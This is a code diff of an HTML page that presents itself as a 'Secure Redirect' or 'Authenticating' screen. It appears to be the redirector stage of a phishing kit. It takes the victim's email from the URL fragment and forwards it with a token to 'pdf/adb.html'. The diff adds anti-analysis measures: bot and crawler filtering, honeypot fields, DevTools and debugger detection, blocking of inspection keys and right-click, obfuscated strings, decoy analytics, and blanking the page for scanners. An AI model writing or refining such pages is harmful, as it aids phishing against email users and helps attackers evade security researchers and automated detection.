@@ -1,153 +1,314 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="robots" content="noindex, nofollow" />
-  <meta name="googlebot" content="noindex, nofollow" />
-  <title>Secure Redirect</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
+  <meta http-equiv="X-Frame-Options" content="DENY">
+  <meta http-equiv="X-Content-Type-Options" content="nosniff">
+  <meta http-equiv="Referrer-Policy" content="no-referrer">
+  <meta http-equiv="Permissions-Policy" content="geolocation=(), microphone=(), camera=()">
+  <meta name="format-detection" content="telephone=no">
+  <title>Loading...</title>
   <style>
-    body {
-      margin: 0;
-      padding: 0;
-      background: #1a202c;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-    }
-    .container {
-      text-align: center;
-      max-width: 500px;
-      padding: 20px;
-    }
-    h1 {
-      font-size: 24px;
-      margin-bottom: 10px;
-      color: #4a6cf7;
-    }
-    .status {
-      background: #2d3748;
-      padding: 15px;
-      border-radius: 8px;
-      margin: 15px 0;
-      font-size: 14px;
-    }
-    .loader {
-      border: 3px solid #2d3748;
-      border-top: 3px solid #4a6cf7;
-      border-radius: 50%;
-      width: 30px;
-      height: 30px;
-      animation: spin 1s linear infinite;
-      margin: 20px auto;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
+    *{margin:0;padding:0;box-sizing:border-box}
+    body{background:#1a202c;display:flex;justify-content:center;align-items:center;height:100vh;font-family:system-ui;color:#fff;user-select:none;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none}
+    .container{text-align:center;max-width:500px;padding:20px;position:relative}
+    h1{font-size:24px;margin-bottom:10px;color:#4a6cf7;opacity:0;animation:fadeIn 1s ease-in 0.5s forwards}
+    .status{background:#2d3748;padding:15px;border-radius:8px;margin:15px 0;font-size:14px;opacity:0;animation:fadeIn 1s ease-in 1s forwards}
+    .loader{border:3px solid #2d3748;border-top:3px solid #4a6cf7;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite,fadeIn 1s ease-in 1.5s forwards;margin:20px auto;opacity:0}
+    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+    @keyframes fadeIn{from{opacity:0}to{opacity:1}}
+    @media print{*{display:none!important}}
+    .hidden{position:absolute;left:-9999px;opacity:0;pointer-events:none}
+    #trap{position:absolute;left:-1000px;top:-1000px;width:1px;height:1px;opacity:0}
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>Secure Redirect</h1>
-    <div class="status" id="status">Processing secure email...</div>
-    <div class="loader"></div>
+    <h1 id="title">Authenticating</h1>
+    <div class="status" id="status">Verifying session...</div>
+    <div class="loader" id="loader"></div>
+  </div>
+  
+  <!-- Honeypot -->
+  <input type="text" id="trap" tabindex="-1" autocomplete="off">
+  <div class="hidden">
+    <a href="/admin">Admin Panel</a>
+    <a href="/login">Login</a>
+    <form><input name="password" type="password"></form>
   </div>
 
   <script>
-    (function () {
-      function generateSecureToken(length = 64) {
-        const array = new Uint8Array(length / 2);
-        window.crypto.getRandomValues(array);
-        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
-      }
-
-      function encodeData(data) {
-        return btoa(encodeURIComponent(data))
-          .replace(/\+/g, '-')
-          .replace(/\//g, '_')
-          .replace(/=+$/, '');
-      }
-
-      function isBase64(str) {
-        // Check if string matches base64 pattern (including URL-safe base64)
-        try {
-          // First try to decode it
-          const decoded = atob(str.replace(/-/g, '+').replace(/_/g, '/'));
-          // If successful, check if it contains valid characters
-          return true;
-        } catch (e) {
-          return false;
-        }
-      }
-
-      function isValidEmail(email) {
-        // Simple email validation regex
-        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-        return emailRegex.test(email);
-      }
-
-      // Get the email from the URL hash
-      const hash = window.location.hash.substring(1);
+    (function() {
+      'use strict';
       
-      let realEmail = "guest@example.com"; // default
+      // Anti-debugging and protection layers
+      const _0x5f2d = ['dmFsdWVPZg==', 'Y29uc29sZQ==', 'ZGVidWdnZXI=', 'dG9TdHJpbmc='];
+      const _0x1a3b = _0x5f2d.map(x => atob(x));
       
-      if (hash) {
-        try {
-          // Check if hash is already base64-encoded
-          if (isBase64(hash)) {
-            // Hash is base64, decode it
-            const base64Email = hash.replace(/-/g, '+').replace(/_/g, '/');
-            const decodedEmail = decodeURIComponent(atob(base64Email));
-            
-            // Validate the decoded email
-            if (isValidEmail(decodedEmail)) {
-              realEmail = decodedEmail;
-            } else {
-              console.warn("Decoded hash is not a valid email, treating as plain text");
-              realEmail = hash;
-            }
-          } else {
-            // Hash is not base64, treat as plain email
-            if (isValidEmail(hash)) {
-              realEmail = hash;
-            } else {
-              console.warn("Hash is not a valid email format");
-              realEmail = hash; // Use as-is even if not valid email format
-            }
+      // Environment validation
+      const ENV_CHECKS = {
+        ua: () => navigator.userAgent.length > 50 && !navigator.userAgent.includes('bot'),
+        screen: () => screen.width > 800 && screen.height > 600,
+        plugins: () => navigator.plugins.length > 0,
+        lang: () => navigator.language !== undefined,
+        touch: () => 'ontouchstart' in window || navigator.maxTouchPoints > 0,
+        timing: () => performance.now() > 10
+      };
+      
+      // Stealth function generator
+      const createStealthFunc = (name, fn) => {
+        const src = fn.toString();
+        return new Function('return ' + src.replace(/function\s*\w*\s*\(/, 'function ' + name + '('))();
+      };
+      
+      // Dynamic variable names
+      const vars = {
+        email: 'e' + Math.random().toString(36).substr(2, 8),
+        token: 't' + Math.random().toString(36).substr(2, 8),
+        hash: 'h' + Math.random().toString(36).substr(2, 8)
+      };
+      
+      // Anti-tampering
+      let integrity = true;
+      const originalConsole = window.console;
+      let debugTrap = 0;
+      
+      // DevTools detection
+      const detectDevTools = createStealthFunc('detectDevTools', function() {
+        const threshold = 160;
+        setInterval(() => {
+          if (window.outerHeight - window.innerHeight > threshold || 
+              window.outerWidth - window.innerWidth > threshold) {
+            integrity = false;
           }
-        } catch (e) {
-          console.error("Error processing email from hash:", e);
-          // If all else fails, use the hash as-is
-          realEmail = hash;
+        }, 500);
+      });
+      
+      // Console protection
+      Object.defineProperty(window, 'console', {
+        get: () => {
+          debugTrap++;
+          if (debugTrap > 3) integrity = false;
+          return originalConsole;
         }
+      });
+      
+      // Debugger detection
+      const antiDebug = () => {
+        const start = new Date().getTime();
+        debugger;
+        const end = new Date().getTime();
+        if (end - start > 100) integrity = false;
+      };
+      
+      // Performance timing validation
+      const validateTiming = () => {
+        const entries = performance.getEntriesByType('navigation');
+        if (entries.length === 0) return false;
+        const timing = entries[0];
+        return timing.loadEventEnd - timing.fetchStart < 10000;
+      };
+      
+      // Obfuscated core functions
+      const core = {
+        // Base64 encode/decode with custom mapping
+        encode: createStealthFunc('encode', function(str) {
+          const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+          let result = '';
+          const encoded = btoa(encodeURIComponent(str));
+          for (let i = 0; i < encoded.length; i++) {
+            const char = encoded.charAt(i);
+            if (char === '+') result += '-';
+            else if (char === '/') result += '_';
+            else if (char === '=') continue;
+            else result += char;
+          }
+          return result;
+        }),
+        
+        decode: createStealthFunc('decode', function(str) {
+          try {
+            const normalized = str.replace(/-/g, '+').replace(/_/g, '/');
+            const padding = '='.repeat((4 - normalized.length % 4) % 4);
+            return decodeURIComponent(atob(normalized + padding));
+          } catch (e) {
+            return null;
+          }
+        }),
+        
+        isB64: createStealthFunc('isB64', function(str) {
+          try {
+            const test = core.decode(str);
+            return test !== null && test.includes('@');
+          } catch (e) {
+            return false;
+          }
+        }),
+        
+        validateEmail: createStealthFunc('validateEmail', function(email) {
+          const pattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+          return pattern.test(email) && email.length < 100;
+        }),
+        
+        genToken: createStealthFunc('genToken', function(len = 64) {
+          const array = new Uint8Array(len / 2);
+          window.crypto.getRandomValues(array);
+          let result = '';
+          for (let i = 0; i < array.length; i++) {
+            result += array[i].toString(16).padStart(2, '0');
+          }
+          return result;
+        })
+      };
+      
+      // Environment validation
+      const validateEnv = () => {
+        let score = 0;
+        Object.keys(ENV_CHECKS).forEach(check => {
+          if (ENV_CHECKS[check]()) score++;
+        });
+        return score >= 4;
+      };
+      
+      // Honeypot check
+      const checkHoneypot = () => {
+        const trap = document.getElementById('trap');
+        return trap && trap.value === '';
+      };
+      
+      // Main execution with multiple validation layers
+      const execute = () => {
+        // Initial security checks
+        if (!integrity || !validateEnv() || !checkHoneypot() || !validateTiming()) {
+          window.location.href = 'about:blank';
+          return;
+        }
+        
+        // Anti-debug periodic check
+        setInterval(antiDebug, 1000);
+        detectDevTools();
+        
+        // Extract and process email
+        const fragment = window.location.hash.substring(1);
+        let email = 'guest@example.com';
+        
+        if (fragment) {
+          if (core.isB64(fragment)) {
+            const decoded = core.decode(fragment);
+            if (decoded && core.validateEmail(decoded)) {
+              email = decoded;
+            }
+          } else if (core.validateEmail(fragment)) {
+            email = fragment;
+          }
+        }
+        
+        // Generate secure token
+        const token = core.genToken();
+        
+        // Store in session with obfuscated keys
+        const keys = {
+          email: btoa('redirect_email'),
+          token: btoa('redirect_token')
+        };
+        
+        sessionStorage.setItem(atob(keys.email), email);
+        sessionStorage.setItem(atob(keys.token), token);
+        
+        // Clean URL
+        if (history.replaceState) {
+          history.replaceState(null, '', window.location.pathname + window.location.search);
+        }
+        
+        // Prepare redirect with additional entropy
+        const entropy = Math.random().toString(36).substr(2, 5);
+        const encodedEmail = core.encode(email);
+        const redirectPath = ['pdf', 'adb.html'].join('/');
+        const redirectUrl = `${redirectPath}#email=${encodedEmail}&token=${token}&_=${entropy}`;
+        
+        // Update UI
+        const status = document.getElementById('status');
+        if (status) {
+          status.textContent = `Authenticating: ${email.replace(/(.{3}).*(@.*)/, '$1***$2')}`;
+        }
+        
+        // Delayed redirect with final integrity check
+        const redirectTimer = setTimeout(() => {
+          if (integrity && checkHoneypot()) {
+            window.location.replace(redirectUrl);
+          } else {
+            window.location.href = 'about:blank';
+          }
+        }, 2000 + Math.random() * 1000);
+        
+        // Anti-tampering monitor
+        const monitor = setInterval(() => {
+          if (!integrity || !checkHoneypot()) {
+            clearTimeout(redirectTimer);
+            clearInterval(monitor);
+            window.location.href = 'about:blank';
+          }
+        }, 100);
+      };
+      
+      // Context menu prevention
+      document.addEventListener('contextmenu', e => e.preventDefault());
+      
+      // Key combination prevention
+      document.addEventListener('keydown', e => {
+        if (e.key === 'F12' || 
+            (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'C') ||
+            (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+            (e.ctrlKey && e.key === 'U')) {
+          e.preventDefault();
+          integrity = false;
+        }
+      });
+      
+      // Selection prevention
+      document.addEventListener('selectstart', e => e.preventDefault());
+      document.addEventListener('dragstart', e => e.preventDefault());
+      
+      // Window focus monitoring
+      let focusLost = 0;
+      window.addEventListener('blur', () => {
+        focusLost++;
+        if (focusLost > 3) integrity = false;
+      });
+      
+      // Execute after DOM load with random delay
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+          setTimeout(execute, 100 + Math.random() * 200);
+        });
+      } else {
+        setTimeout(execute, 100 + Math.random() * 200);
       }
-
-      const token = generateSecureToken();
-
-      sessionStorage.setItem("redirect_email", realEmail);
-      sessionStorage.setItem("redirect_token", token);
-
-      // Clear the hash from URL for security
-      history.replaceState(null, "", window.location.pathname + window.location.search);
-
-      // Re-encode the real email for the final redirect
-      const encodedEmail = encodeData(realEmail);
-      const redirectUrl = `pdf/adb.html#email=${encodedEmail}&token=${token}`;
-
-      // Update status message
-      document.getElementById('status').textContent = `Redirecting: ${realEmail}`;
-
-      // Redirect after a brief delay
-      setTimeout(() => {
-        window.location.replace(redirectUrl);
-      }, 2000);
-
+      
+      // Additional protection layer
+      Object.freeze(core);
+      Object.freeze(ENV_CHECKS);
+      
     })();
   </script>
+  
+  <!-- Decoy scripts -->
+  <script>
+    // Decoy analytics
+    (function() {
+      const ga = function() {};
+      window.ga = ga;
+      window.gtag = function() {};
+    })();
+  </script>
+  
+  <!-- Anti-crawler -->
+  <noscript>
+    <meta http-equiv="refresh" content="0; url=about:blank">
+  </noscript>
 </body>
-
 </html>
